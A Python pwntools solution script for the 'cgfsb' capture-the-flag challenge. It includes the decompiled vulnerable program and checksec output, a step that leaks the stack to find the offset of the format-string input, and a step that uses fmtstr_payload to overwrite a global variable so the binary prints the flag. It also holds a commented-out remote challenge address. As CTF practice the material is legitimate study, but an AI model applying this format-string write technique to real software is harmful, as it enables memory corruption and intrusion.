"""
>>> checksec cgfsb
[*] '/home/xxxx/cgfsb'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE

int __cdecl main(int argc, const char **argv, const char **envp)
{
  int buf; // [esp+1Eh] [ebp-7Eh]
  int v5; // [esp+22h] [ebp-7Ah]
  __int16 v6; // [esp+26h] [ebp-76h]
  char s; // [esp+28h] [ebp-74h]
  unsigned int v8; // [esp+8Ch] [ebp-10h]

  v8 = __readgsdword(0x14u);
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  setbuf(stderr, 0);
  buf = 0;
  v5 = 0;
  v6 = 0;
  memset(&s, 0, 0x64u);
  puts("please tell me your name:");
  read(0, &buf, 0xAu);
  puts("leave your message please:");
  fgets(&s, 100, stdin);
  printf("hello %s", &buf);
  puts("your message is:");
  printf(&s);
  if ( pwnme == 8 )
  {
    puts("you pwned me, here is your flag:\n");
    system("cat flag");
  }
  else
  {
    puts("Thank you!");
  }
  return 0;
}
"""
from pwn import *


def step1():
    """
    确定偏移量 从第10个位置开始出现了我们输入的字符 aaaa
    hello 666
    your message is:
    aaaaaaaa.ffd9c69e.f7ec55a0.f0b6ff.ffd9c6ce.1.c2.363636bb.a36.0.61616161.61616161.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.
    Thank you!
    """

    # r = remote('111.198.29.45', 31431)
    r = process("cgfsb")
    r.recvuntil("please tell me your name:")
    r.send('666\n')
    r.recvuntil("leave your message please:")
    r.send("aaaaaaaa." + "%x." * 20 + "\n")
    print(r.recvall().decode())


def step2():
    # r = remote('111.198.29.45', 31431)
    r = process("cgfsb")
    r.recvuntil("please tell me your name:")
    r.send('666\n')
    r.recvuntil("leave your message please:")

    p_pwnme = 0x0804A068
    payload = fmtstr_payload(10, {p_pwnme: 8})
    r.send(payload)
    r.interactive()


if __name__ == '__main__':
    step1()
    # step2()
